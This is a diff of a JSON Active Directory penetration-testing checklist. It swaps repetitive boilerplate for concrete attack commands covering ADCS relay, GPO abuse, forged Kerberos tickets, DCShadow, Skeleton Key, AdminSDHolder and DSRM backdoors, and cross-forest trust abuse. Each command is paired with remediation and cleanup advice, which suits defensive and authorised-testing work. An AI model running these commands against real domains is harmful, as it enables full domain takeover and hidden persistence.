+          "how_to_find": "Relay coerced DC auth to CA web enrollment for a DC cert:\n\n```\ncertipy relay -target http://<ca>/certsrv/ -template DomainController\n# coerce the DC (PetitPotam) to authenticate\n```",
+          "how_to_fix": "Disable NTLM on the CA web enrollment, enable EPA + HTTPS, remove the web enrollment role if unused, patch coercion, and require signing. Re-test ESC8 relay fails.",
           "tools": [
             "Certipy",
             "impacket (ntlmrelayx)",
@@ -2736,8 +2736,8 @@
           "title": "Use certificates for stealthy persistence",
           "description": "Enroll long-lived certificates (or steal existing ones) to maintain authentication ability that survives password resets, leveraging the certificate validity period for durable access.",
           "severity": "high",
-          "how_to_find": "Validate use certificates for stealthy persistence in Privilege Escalation & Delegation — ADCS Certificate Abuse (ESC1-ESC8). Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for use certificates for stealthy persistence, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Request a long-lived user/machine cert for durable auth (survives password changes):\n\n```\ncertipy req -u <user>@<domain> -p <pass> -ca <CA> -template User\n# authenticate anytime with the pfx via PKINIT\n```",
+          "how_to_fix": "Monitor certificate issuance, restrict enrollment, shorten validity for sensitive templates, and revoke/rotate the CA if abuse is suspected (cert-based auth survives password resets). Re-audit issued certs.",
           "tools": [
             "Certipy",
             "Rubeus",
@@ -2769,8 +2769,8 @@
           "title": "Find writable GPOs and their links",
           "description": "Enumerate GPOs over which a controlled principal holds edit rights and the OUs/domains they are linked to, scoping which machines and users would be affected by a modification.",
           "severity": "medium",
-          "how_to_find": "Validate find writable gpos and their links in Privilege Escalation & Delegation — GPO Modification Abuse. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for find writable gpos and their links, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Identify GPOs you can edit and where they apply:\n\n```\n# BloodHound edge GPO GenericWrite/WriteDacl, or:\nGet-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'Write'}\n```",
+          "how_to_fix": "Remove GPO write access from non-admins, restrict GPO editing to delegated admins, monitor GPO changes, and review OU/domain links. Re-audit GPO ACLs.",
           "tools": [
             "PowerView",
             "BloodHound",
@@ -2797,8 +2797,8 @@
           "title": "Add a controlled account to local administrators via GPO",
           "description": "Modify a writable GPO to add a controlled principal to the local Administrators group on all affected machines, granting widespread local admin once the policy refreshes.",
           "severity": "critical",
-          "how_to_find": "Validate add a controlled account to local administrators via gpo in Privilege Escalation & Delegation — GPO Modification Abuse. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for add a controlled account to local administrators via gpo, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Abuse a writable GPO to add yourself to local admins on linked hosts:\n\n```\nSharpGPOAbuse.exe --AddLocalAdmin --UserAccount <you> --GPOName \"<gpo>\"\n# or pyGPOAbuse\n```",
+          "how_to_fix": "Remove GPO write access, restore the GPO, monitor GPO + local-group changes, and tier administration. Re-audit and remove any planted admin. Re-verify GPO ACLs.",
           "tools": [
             "SharpGPOAbuse",
             "PowerView",
@@ -2825,8 +2825,8 @@
           "title": "Deploy an immediate scheduled task via GPO",
           "description": "Add an immediate scheduled task to a writable GPO to execute an arbitrary payload as SYSTEM (computer policy) or in user context across all affected objects.",
           "severity": "critical",
-          "how_to_find": "Validate deploy an immediate scheduled task via gpo in Privilege Escalation & Delegation — GPO Modification Abuse. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for deploy an immediate scheduled task via gpo, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Push an immediate scheduled task (runs as SYSTEM on linked hosts):\n\n```\nSharpGPOAbuse.exe --AddComputerTask --TaskName x --Command cmd.exe --Arguments \"/c ...\" --GPOName \"<gpo>\"\n```",
+          "how_to_fix": "Remove GPO write access, delete the malicious task, monitor scheduled-task creation (4698) + GPO changes, and restrict editing. Re-audit.",
           "tools": [
             "SharpGPOAbuse",
             "PowerView"
@@ -2852,8 +2852,8 @@
           "title": "Inject startup/logon scripts via GPO",
           "description": "Place a malicious startup or logon script into the SYSVOL GPO folder and register it in the GPO so it runs on next boot or user logon across the policy scope.",
           "severity": "high",
-          "how_to_find": "Privilege Escalation & Delegation — GPO Modification Abuse: Privilege Escalation & Delegation — GPO Modification Abuse: Privilege Escalation & Delegation — GPO Modification Abuse: Privilege Escalation & Delegation — GPO Modification Abuse: Privilege Escalation & Delegation — GPO Modification Abuse: A startup/logon script you placed runs on affected machines or sessions",
-          "how_to_fix": "Assign an owner for inject startup/logon scripts via gpo, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Add a startup/logon script to a writable GPO:\n\n```\n# edit \\\\<domain>\\SYSVOL\\...\\Machine\\Scripts\\ + scripts.ini via SharpGPOAbuse/pyGPOAbuse\n```",
+          "how_to_fix": "Remove GPO write access, restore SYSVOL script config, monitor SYSVOL + GPO changes, and restrict editing. Re-audit.",
           "tools": [
             "SharpGPOAbuse",
             "PowerView"
@@ -2879,8 +2879,8 @@
           "title": "Revert GPO changes and verify scope",
           "description": "After exploitation, revert all GPO modifications and confirm no residual scheduled tasks, local-admin entries, or scripts persist, restoring the policy to its original state.",
           "severity": "low",
-          "how_to_find": "Privilege Escalation & Delegation — GPO Modification Abuse: Privilege Escalation & Delegation — GPO Modification Abuse: Privilege Escalation & Delegation — GPO Modification Abuse: Privilege Escalation & Delegation — GPO Modification Abuse: Privilege Escalation & Delegation — GPO Modification Abuse: After exploitation, revert all GPO modifications and confirm no residual scheduled tasks, local-admin entries, or scripts persist, restoring the policy to its original state",
-          "how_to_fix": "Assign an owner for revert gpo changes and verify scope, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "After testing, remove all GPO modifications and confirm affected hosts:\n\n```\ngpupdate /force   # on test hosts to confirm revert\n```",
+          "how_to_fix": "Process step: revert all GPO changes, document affected OUs/hosts, and verify no residual tasks/scripts/admins remain. Provides a clean, auditable engagement.",
           "tools": [
             "SharpGPOAbuse",
             "PowerView"
@@ -2911,8 +2911,8 @@
           "title": "Forge a Golden Ticket with the krbtgt key",
           "description": "Using the krbtgt NT hash or AES key, forge a TGT for any user (including a fabricated one) with arbitrary group membership, granting domain-wide access that persists until krbtgt is rotated twice.",
           "severity": "critical",
-          "how_to_find": "Validate forge a golden ticket with the krbtgt key in Persistence & Domain Dominance — Golden, Silver & Diamond Tickets. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for forge a golden ticket with the krbtgt key, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "With the krbtgt hash, forge a TGT for any user:\n\n```\nticketer.py -nthash <krbtgt-hash> -domain-sid <sid> -domain <domain> administrator\n# mimikatz kerberos::golden ...\n```",
+          "how_to_fix": "Golden Tickets imply full compromise: rotate krbtgt twice (with interval), investigate initial access, monitor for anomalous TGTs (long lifetimes, mismatched RC4), and tier administration. Re-verify after krbtgt rotation.",
           "tools": [
             "Mimikatz",
             "impacket (ticketer)",
@@ -2939,8 +2939,8 @@
           "title": "Forge a Silver Ticket for a target service",
           "description": "Using a service account or machine account key, forge a TGS directly to a specific service (CIFS, HOST, MSSQL) without contacting the DC, providing stealthy targeted access.",
           "severity": "high",
-          "how_to_find": "Validate forge a silver ticket for a target service in Persistence & Domain Dominance — Golden, Silver & Diamond Tickets. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for forge a silver ticket for a target service, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "With a service account's hash, forge a TGS for that service (no DC contact):\n\n```\nticketer.py -nthash <svc-hash> -domain-sid <sid> -domain <domain> -spn cifs/<host> administrator\n```",
+          "how_to_fix": "Rotate the service account key (gMSA), enforce AES, monitor service access without preceding TGS from the DC, and least-privilege service accounts. Re-verify.",
           "tools": [
             "Mimikatz",
             "impacket (ticketer)",
@@ -2967,8 +2967,8 @@
           "title": "Forge a Diamond Ticket to evade detection",
           "description": "Request a legitimate TGT and modify its decrypted contents (groups, validity) using the krbtgt key, producing a ticket that closely matches real ones and evades anomaly detection that catches Golden Tickets.",
           "severity": "high",
-          "how_to_find": "Validate forge a diamond ticket to evade detection in Persistence & Domain Dominance — Golden, Silver & Diamond Tickets. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for forge a diamond ticket to evade detection, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Modify a real TGT (request then re-encrypt with krbtgt key) to blend in:\n\n```\nRubeus.exe diamond /krbkey:<aes> /user:<u> /ticketuser:administrator ...\n```",
+          "how_to_fix": "Same as Golden: rotate krbtgt (x2), enforce AES, and improve Kerberos anomaly detection. Investigate compromise. Re-verify after rotation.",
           "tools": [
             "Rubeus",
             "impacket (ticketer)"
@@ -2994,8 +2994,8 @@
           "title": "Use enterprise/inter-realm ticket variants",
           "description": "Leverage advanced forging variants (Sapphire/enterprise tickets, inter-realm referral tickets) to extend forged-ticket reach across the forest or to better blend with legitimate PAC data.",
           "severity": "high",
-          "how_to_find": "Validate use enterprise/inter-realm ticket variants in Persistence & Domain Dominance — Golden, Silver & Diamond Tickets. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for use enterprise/inter-realm ticket variants, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Forge enterprise/inter-realm tickets for cross-domain/forest movement (with the relevant trust/krbtgt key).",
+          "how_to_fix": "Protect krbtgt + trust keys, enable SID filtering on trusts, rotate keys if exposed, and monitor cross-realm tickets. Re-verify trust hardening.",
           "tools": [
             "impacket (ticketer)",
             "Rubeus",
@@ -3022,8 +3022,8 @@
           "title": "Advise on krbtgt rotation and remediation",
           "description": "Document that evicting Golden Ticket persistence requires resetting the krbtgt password twice (with replication between resets), and provide remediation guidance for affected service keys.",
           "severity": "medium",
-          "how_to_find": "Validate advise on krbtgt rotation and remediation in Persistence & Domain Dominance — Golden, Silver & Diamond Tickets. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for advise on krbtgt rotation and remediation, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Confirm whether krbtgt has been rotated recently and plan a double-reset (breaks all forged tickets):\n\n```\nGet-ADUser krbtgt -Properties PasswordLastSet\n# use the New-KrbtgtKeys.ps1 double-reset procedure\n```",
+          "how_to_fix": "Rotate krbtgt twice with a delay >= max ticket lifetime (and after any DA compromise), automate periodic rotation, and monitor. Re-verify PasswordLastSet is recent.",
           "tools": [
             "Mimikatz"
           ],
@@ -3053,8 +3053,8 @@
           "title": "Register a rogue DC",
           "description": "Use Mimikatz lsadump::dcshadow to temporarily register the attacker host as a domain controller in the configuration partition, the prerequisite for pushing replicated changes.",
           "severity": "critical",
-          "how_to_find": "Validate register a rogue dc in Persistence & Domain Dominance — DCShadow. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for register a rogue dc, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "With DA/equivalent, register a fake DC to push replication:\n\n```\n# mimikatz lsadump::dcshadow /object:<target> /attribute:<attr> /value:<val>\n# then lsadump::dcshadow /push\n```",
+          "how_to_fix": "DCShadow requires high privilege — treat as full compromise. Restrict who can register DCs (replication rights), monitor for rogue replication (unexpected DC objects, 4662/replication from non-DCs), and tier administration. Investigate + reset.",
           "tools": [
             "Mimikatz"
           ],
@@ -3079,8 +3079,8 @@
           "title": "Push stealthy directory modifications",
           "description": "Through the rogue DC, push attribute changes (add SID history, modify primaryGroupID, alter ACLs) that replicate to legitimate DCs without generating the usual change-audit events.",
           "severity": "critical",
-          "how_to_find": "Validate push stealthy directory modifications in Persistence & Domain Dominance — DCShadow. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for push stealthy directory modifications, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Use DCShadow to write attributes (SID history, SPNs, ACLs) without normal audit trails via the replication channel.",
+          "how_to_fix": "Monitor replication metadata + unexpected DC registrations, restrict replication rights, and alert on DCShadow indicators. Reset affected objects. Re-audit.",
           "tools": [
             "Mimikatz"
           ],
@@ -3105,8 +3105,8 @@
           "title": "Inject SID history via DCShadow",
           "description": "Use DCShadow to add a privileged SID (e.g., Domain Admins) to the sIDHistory of a controlled account, granting it elevated rights without visible group membership changes.",
           "severity": "critical",
-          "how_to_find": "Validate inject sid history via dcshadow in Persistence & Domain Dominance — DCShadow. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for inject sid history via dcshadow, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Push `sIDHistory` onto a controlled account to inherit privileged group access stealthily.",
+          "how_to_fix": "Monitor `sIDHistory` changes, enable SID filtering on trusts, restrict replication rights, and clear illegitimate SID history. Re-audit sIDHistory across accounts.",
           "tools": [
             "Mimikatz"
           ],
@@ -3131,8 +3131,8 @@
           "title": "Confirm DCShadow prerequisites",
           "description": "Verify the required rights (DA-equivalent, or specific replication and configuration write rights) and the second authentication context DCShadow needs, before attempting the attack.",
           "severity": "medium",
-          "how_to_find": "Persistence & Domain Dominance — DCShadow: Persistence & Domain Dominance — DCShadow: Persistence & Domain Dominance — DCShadow: Persistence & Domain Dominance — DCShadow: Persistence & Domain Dominance — DCShadow: You confirm the privileges and dual-context requirements are satisfied for DCShadow",
-          "how_to_fix": "Assign an owner for confirm dcshadow prerequisites, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Verify the required rights (DS-Install-Replica, replication ACEs, local admin) before attempting DCShadow.",
+          "how_to_fix": "Restrict these rights to legitimate DCs/admins, monitor for their assignment, and tier administration. Re-audit who holds replication/DC-install rights.",
           "tools": [
             "Mimikatz",
             "PowerView"
@@ -3158,8 +3158,8 @@
           "title": "Deregister the rogue DC and verify",
           "description": "After pushing changes, deregister the rogue DC from the configuration partition and confirm no leftover server/nTDSDSA objects remain, keeping the directory clean.",
           "severity": "low",
-          "how_to_find": "Persistence & Domain Dominance — DCShadow: Persistence & Domain Dominance — DCShadow: Persistence & Domain Dominance — DCShadow: Persistence & Domain Dominance — DCShadow: Persistence & Domain Dominance — DCShadow: After pushing changes, deregister the rogue DC from the configuration partition and confirm no leftover server/nTDSDSA objects remain, keeping the directory clean",
-          "how_to_fix": "Assign an owner for deregister the rogue dc and verify, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "After testing, remove the rogue DC registration and confirm cleanup:\n\n```\n# mimikatz completes/reverts the nTDSDSA object; verify no residual DC objects\n```",
+          "how_to_fix": "Process step: deregister the rogue DC, remove residual objects/attributes, and verify replication topology is clean. Provides an auditable engagement.",
           "tools": [
             "Mimikatz",
             "PowerView"
@@ -3190,8 +3190,8 @@
           "title": "Inject a Skeleton Key into LSASS on a DC",
           "description": "Patch LSASS on a domain controller with Mimikatz misc::skeleton to add a master password that authenticates as any user alongside their real password, until the DC reboots.",
           "severity": "critical",
-          "how_to_find": "Validate inject a skeleton key into lsass on a dc in Persistence & Domain Dominance — Skeleton Key, AdminSDHolder & DSRM. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for inject a skeleton key into lsass on a dc, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Patch LSASS on a DC so a master password works for any account (in-memory):\n\n```\n# mimikatz misc::skeleton (on a DC, requires DA)\n```",
+          "how_to_fix": "Requires DC compromise — treat as full breach. Enable Credential Guard/LSA protection, restrict DA/DC access (tiering), monitor LSASS tampering (EDR), and reboot DCs to clear. Investigate + reset credentials.",
           "tools": [
             "Mimikatz"
           ],
@@ -3216,8 +3216,8 @@
           "title": "Backdoor AdminSDHolder for persistent rights",
           "description": "Add a controlled principal to the AdminSDHolder object DACL.",
           "severity": "critical",
-          "how_to_find": "Validate backdoor adminsdholder for persistent rights in Persistence & Domain Dominance — Skeleton Key, AdminSDHolder & DSRM. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for backdoor adminsdholder for persistent rights, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Add an ACE to AdminSDHolder so SDProp re-grants you rights on all protected groups every 60 min:\n\n```\n# add GenericAll for <you> on CN=AdminSDHolder,CN=System,DC=...\nAdd-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,...' -PrincipalIdentity <you> -Rights All\n```",
+          "how_to_fix": "Audit and clean the AdminSDHolder ACL, monitor changes to it, restrict WriteDacl on it, and verify SDProp propagation. Remove the backdoor ACE and let SDProp restore protected objects. Re-audit.",
           "tools": [
             "PowerView",
             "impacket (dacledit)",
@@ -3244,8 +3244,8 @@
           "title": "Enable DSRM logon persistence",
           "description": "Recover or set the DSRM (Directory Services Restore Mode) local admin hash on a DC and set DsrmAdminLogonBehavior so it can authenticate over the network, giving a durable DC backdoor.",
           "severity": "critical",
-          "how_to_find": "Validate enable dsrm logon persistence in Persistence & Domain Dominance — Skeleton Key, AdminSDHolder & DSRM. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for enable dsrm logon persistence, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Set the DSRM admin to allow network logon (persistent local backdoor on a DC):\n\n```\n# reg set DsrmAdminLogonBehavior=2 ; then PtH the DSRM (local admin) hash\n```",
+          "how_to_fix": "Monitor the `DsrmAdminLogonBehavior` registry value, restrict DC access, rotate the DSRM password, and alert on DSRM logons. Reset if abused. Re-audit the setting.",
           "tools": [
             "Mimikatz",
             "impacket (secretsdump)"
@@ -3271,8 +3271,8 @@
           "title": "Plant durable ACL backdoors on key objects",
           "description": "Add subtle ACEs (e.g., DCSync rights, GenericAll on a service account) to durable objects so access can be re-established even if the primary foothold is remediated.",
           "severity": "high",
-          "how_to_find": "Validate plant durable acl backdoors on key objects in Persistence & Domain Dominance — Skeleton Key, AdminSDHolder & DSRM. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for plant durable acl backdoors on key objects, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Add hidden ACEs (DCSync on domain, control of privileged groups) for persistence.",
+          "how_to_fix": "Baseline + monitor ACLs on the domain object and privileged groups, alert on DACL changes, and remove illegitimate ACEs. Re-audit periodically.",
           "tools": [
             "PowerView",
             "impacket (dacledit)"
@@ -3298,8 +3298,8 @@
           "title": "Document and remove all persistence artifacts",
           "description": "Inventory every persistence mechanism planted (tickets, skeleton key, ACLs, DSRM, AdminSDHolder) and ensure each is documented for the report and fully removed at engagement close.",
           "severity": "medium",
-          "how_to_find": "Persistence & Domain Dominance — Skeleton Key, AdminSDHolder & DSRM: Persistence & Domain Dominance — Skeleton Key, AdminSDHolder & DSRM: Persistence & Domain Dominance — Skeleton Key, AdminSDHolder & DSRM: Persistence & Domain Dominance — Skeleton Key, AdminSDHolder & DSRM: Persistence & Domain Dominance — Skeleton Key, AdminSDHolder & DSRM: Every persistence artifact is recorded and confirmed removed before engagement closure",
-          "how_to_fix": "Assign an owner for document and remove all persistence artifacts, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "List every persistence mechanism established during testing (tickets, ACEs, accounts, registry, GPOs) for removal.",
+          "how_to_fix": "Process step: remove all persistence, verify AdminSDHolder/DSRM/ACLs are clean, and confirm with the client. Recommend krbtgt rotation if forged tickets were used. Provides an auditable, clean engagement.",
           "tools": [
             "PowerView",
             "Mimikatz"
@@ -3330,8 +3330,8 @@
           "title": "Enumerate trust relationships and directions",
           "description": "Map all trusts with their direction, transitivity, and type (parent-child, tree-root, external, forest), identifying which trusts can be traversed and whether SID filtering is applied.",
           "severity": "low",
-          "how_to_find": "Validate enumerate trust relationships and directions in Trusts & Forest — Domain Trusts & SID History Abuse. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for enumerate trust relationships and directions, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Map trusts (direction, transitivity, type):\n\n```\nnxc ldap <dc-ip> -u <user> -p <pass> -M enum_trusts\nnltest /domain_trusts /all_trusts\n```",
+          "how_to_fix": "Recon step. Defensively: enable SID filtering + selective authentication, remove unnecessary trusts, and treat the forest as the boundary. Review trust config.",
           "tools": [
             "PowerView",
             "netexec/crackmapexec",
@@ -3359,8 +3359,8 @@
           "title": "Escalate child domain to forest root via SID history",
           "description": "From DA in a child domain, forge an inter-realm TGT including the Enterprise Admins SID in SID history.",
           "severity": "critical",
-          "how_to_find": "Validate escalate child domain to forest root via sid history in Trusts & Forest — Domain Trusts & SID History Abuse. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for escalate child domain to forest root via sid history, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Forge an inter-realm ticket with the Enterprise Admins SID in SID history (intra-forest SID filtering is off by default):\n\n```\nticketer.py -nthash <child-krbtgt> -domain-sid <child-sid> -extra-sid <root-sid>-519 ...\n```",
+          "how_to_fix": "Understand the forest (not domain) is the security boundary; where feasible enable SID filtering/quarantine on intra-forest trusts, protect each domain's krbtgt, and monitor extra-SID tickets. Isolate tier-0 across the forest.",
           "tools": [
             "Mimikatz",
             "impacket (ticketer)",
@@ -3387,8 +3387,8 @@
           "title": "Abuse the trust account key (inter-realm trust ticket)",
           "description": "Dump the trust account (TDO) key shared between domains and forge an inter-realm TGT to access the trusted domain, leveraging the trust key rather than krbtgt.",
           "severity": "high",
-          "how_to_find": "Validate abuse the trust account key (inter-realm trust ticket) in Trusts & Forest — Domain Trusts & SID History Abuse. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for abuse the trust account key (inter-realm trust ticket), apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Use the trust account key to forge inter-realm TGTs across a trust:\n\n```\n# dump trust key (secretsdump), then ticketer.py with the inter-realm key\n```",
+          "how_to_fix": "Protect/rotate trust keys, enable SID filtering + selective authentication, remove unnecessary trusts, and monitor inter-realm tickets. Re-audit trust hardening.",
           "tools": [
             "Mimikatz",
             "impacket (secretsdump)",
@@ -3415,8 +3415,8 @@
           "title": "Hunt foreign group memberships and ACLs across trusts",
           "description": "Identify principals from one domain that hold group memberships or ACL rights in a trusted domain.",
           "severity": "medium",
-          "how_to_find": "Validate hunt foreign group memberships and acls across trusts in Trusts & Forest — Domain Trusts & SID History Abuse. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for hunt foreign group memberships and acls across trusts, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Find principals from one domain with rights in another:\n\n```\nGet-DomainForeignGroupMember -Domain <other>   # PowerView\n# BloodHound cross-domain queries\n```",
+          "how_to_fix": "Remove unnecessary cross-domain memberships/ACLs, apply least privilege, enable selective authentication, and monitor cross-trust access. Re-audit foreign principals.",
           "tools": [
             "PowerView",
             "BloodHound"
@@ -3442,8 +3442,8 @@
           "title": "Assess SID filtering and selective authentication",
           "description": "Determine whether SID filtering, SID history quarantine, and selective authentication are enabled on each trust.",
           "severity": "medium",
-          "how_to_find": "Validate assess sid filtering and selective authentication in Trusts & Forest — Domain Trusts & SID History Abuse. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for assess sid filtering and selective authentication, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Check trust properties for SID filtering / selective auth:\n\n```\nnetdom trust <trusting> /domain:<trusted> /quarantine\nGet-ADTrust -Filter * | select Name,SIDFilteringForestAware,SelectiveAuthentication\n```",
+          "how_to_fix": "Enable SID filtering (quarantine) and selective authentication on external trusts, restrict which principals can authenticate across, and remove unneeded trusts. Re-verify settings.",
           "tools": [
             "PowerView",
             "netexec/crackmapexec",
@@ -3475,8 +3475,8 @@
           "title": "Abuse foreign principal access across the forest trust",
           "description": "Identify accounts from a trusting forest granted access (group membership, local admin, ACLs) in your forest and vice versa, then use those legitimate grants to pivot across the forest boundary.",
           "severity": "high",
-          "how_to_find": "Validate abuse foreign principal access across the forest trust in Trusts & Forest — Cross-Forest Attack Paths. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for abuse foreign principal access across the forest trust, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Enumerate and use access granted to principals across a forest trust:\n\n```\nGet-DomainForeignGroupMember -Domain <foreign>\n# BloodHound: cross-forest paths\n```",
+          "how_to_fix": "Enable selective authentication (grant \"Allowed to authenticate\" only where needed), remove unnecessary cross-forest grants, apply least privilege, and monitor. Re-audit.",
           "tools": [
             "PowerView",
             "BloodHound",
@@ -3503,8 +3503,8 @@
           "title": "Abuse unconstrained delegation across forest trust",
           "description": "Where a printer-bug-style coercion can drive a DC from a trusted forest to authenticate to an unconstrained-delegation host (and TGT delegation is not disabled), capture that DC TGT to compromise the foreign forest.",
           "severity": "high",
-          "how_to_find": "Validate abuse unconstrained delegation across forest trust in Trusts & Forest — Cross-Forest Attack Paths. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for abuse unconstrained delegation across forest trust, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "If a host across the trust has unconstrained delegation, capture TGTs of foreign users authenticating to it (TGT delegation across forest is restricted but check config).",
+          "how_to_fix": "Remove unconstrained delegation, disable TGT delegation across forest trusts (default), add sensitive accounts to Protected Users, and enable selective auth. Re-audit delegation + trust flags.",
           "tools": [
             "Rubeus",
             "Mimikatz",
@@ -3532,8 +3532,8 @@
           "title": "Exploit cross-forest ADCS trust",
           "description": "Where a CA is trusted across forests (NTAuth/PKI trust), abuse certificate enrollment or ESC misconfigurations to obtain a certificate that authenticates into the foreign forest.",
           "severity": "high",
-          "how_to_find": "Validate exploit cross-forest adcs trust in Trusts & Forest — Cross-Forest Attack Paths. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for exploit cross-forest adcs trust, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Where a CA is trusted across forests, enumerate/abuse enrollment for cross-forest escalation:\n\n```\ncertipy find -u <user>@<domain> -p <pass> -dc-ip <dc> -vulnerable -stdout\n```",
+          "how_to_fix": "Restrict cross-forest enrollment, remediate vulnerable templates/CA flags, enable EPA/HTTPS on enrollment, and audit issuance. Re-run certipy to confirm.",
           "tools": [
             "Certipy",
             "Certify"
@@ -3559,8 +3559,8 @@
           "title": "Test SID-filtering bypass conditions",
           "description": "Evaluate misconfigured or relaxed forest trusts (e.g., trusts where SID filtering was disabled or TGT delegation enabled) that re-open SID-history and delegation escalation across the forest boundary.",
           "severity": "medium",
-          "how_to_find": "Trusts & Forest — Cross-Forest Attack Paths: Trusts & Forest — Cross-Forest Attack Paths: Trusts & Forest — Cross-Forest Attack Paths: Trusts & Forest — Cross-Forest Attack Paths: Validate test sid-filtering bypass conditions in Trusts & Forest — Cross-Forest Attack Paths",
-          "how_to_fix": "Assign an owner for test sid-filtering bypass conditions, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Test whether SID filtering can be bypassed (e.g. specific SID ranges, misconfig) across the trust with extra-SID tickets.",
+          "how_to_fix": "Ensure SID filtering/quarantine is enforced on external/forest trusts, keep DCs patched (SID-filtering bypass CVEs), and monitor extra-SID tickets. Re-verify filtering blocks injected SIDs.",
           "tools": [
             "PowerView",
             "nltest",
@@ -3587,8 +3587,8 @@
           "title": "Map cross-forest paths in BloodHound",
           "description": "Collect data from both forests into BloodHound and run cross-domain/cross-forest path queries to surface concrete escalation routes that span the trust boundary.",
           "severity": "medium",
-          "how_to_find": "Trusts & Forest — Cross-Forest Attack Paths: Trusts & Forest — Cross-Forest Attack Paths: Trusts & Forest — Cross-Forest Attack Paths: Trusts & Forest — Cross-Forest Attack Paths: Trusts & Forest — Cross-Forest Attack Paths: BloodHound reveals at least one actionable cross-forest path (or confirms none exists)",
-          "how_to_fix": "Assign an owner for map cross-forest paths in bloodhound, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Collect both forests and query cross-forest attack paths in BloodHound:\n\n```\nbloodhound-python -d <forestA> ... ; bloodhound-python -d <forestB> ...\n```",
+          "how_to_fix": "Use the map to remove cross-forest attack paths (foreign ACLs, delegation, trust abuse), enable selective auth + SID filtering, and least-privilege. Re-collect to confirm paths are cut.",
           "tools": [
             "BloodHound",
             "SharpHound",
